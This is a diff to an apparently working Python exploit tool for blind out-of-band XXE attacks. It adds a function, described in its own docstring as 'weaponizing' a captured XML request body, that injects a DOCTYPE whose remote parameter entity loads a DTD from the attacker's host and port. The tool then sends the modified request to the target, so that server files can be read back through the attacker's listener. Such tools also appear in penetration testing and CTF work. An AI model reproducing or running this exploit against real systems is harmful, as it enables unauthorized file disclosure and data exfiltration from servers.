@@ -18,10 +18,20 @@ def parse_args():
         "-l", "--lhost", required=True, help="Attacker IP for the OOB callback URL"
     )
     parser.add_argument(
-        "-p", "--lport", type=int, default=8000, help="Port to listen on (default: 8000)"
+        "-p",
+        "--lport",
+        type=int,
+        default=8000,
+        help="Port to listen on (default: 8000)",
     )
     parser.add_argument(
-        "-r", "--req", default="xxe.req", help="Path to the raw request file (default: xxe.req)"
+        "-r",
+        "--req",
+        default="xxe.req",
+        help="Path to the raw request file (default: xxe.req)",
+    )
+    parser.add_argument(
+        "--dtd", default="xxe.dtd", help="Path to the dtd file (Default: xxe.dtd)"
     )
     return parser.parse_args()
 
@@ -33,6 +43,7 @@ console = Console()
 payload = "Dummy string"
 decoded = "Dummy string"
 REQ_FILE = args.req
+DTD_FILE = args.dtd
 
 # Some XML parsers resolve the OOB parameter entity twice for a single
 # request (once loading the DTD, once expanding it), producing two
@@ -41,12 +52,26 @@ DEDUPE_WINDOW = 2  # seconds
 _seen_content: dict[str, float] = {}
 
 
+def inject_payload(body):
+    """Weaponize a raw XML body with the blind XXE OOB DOCTYPE + entity reference."""
+    decl, sep, rest = body.partition("?>")
+    doctype = (
+        "\n<!DOCTYPE email [\n"
+        f'<!ENTITY % remote SYSTEM "http://{args.lhost}:{args.lport}/{DTD_FILE}">\n'
+        "%remote;\n"
+        "]>"
+    )
+    root_open, gt, remainder = rest.partition(">")
+    return decl + sep + doctype + root_open + gt + "\n&content;" + remainder
+
+
 def load_request(path=REQ_FILE):
     """Parse a raw HTTP request (as saved by Burp) into method/target/headers/body."""
     with open(path) as f:
         raw = f.read()
 
     header, body = raw.split("\n\n")
+    body = inject_payload(body)
 
     header = header.split("\n")
 
@@ -73,7 +98,7 @@ def send_request():
     try:
         resp = requests.request(method, url, headers=headers, data=body, timeout=10)
         console.print(
-            f"[cyan]Sending request to[/cyan] {url} [cyan]->[/cyan]{resp.status_code} "
+            f"[cyan]Sending request to[/cyan] {url} [cyan]->[/cyan] {resp.status_code} "
         )
         console.print(
             Panel(Text(decoded), title="Decoded Content", border_style="green")
@@ -129,7 +154,7 @@ class Terminal(Cmd):
         global payload
 
         # To update the xxe with the user required file dynamically
-        with open("xxe.dtd") as f:
+        with open(DTD_FILE) as f:
             temp_payload = (
                 f.read()
                 .replace("{line}", line)
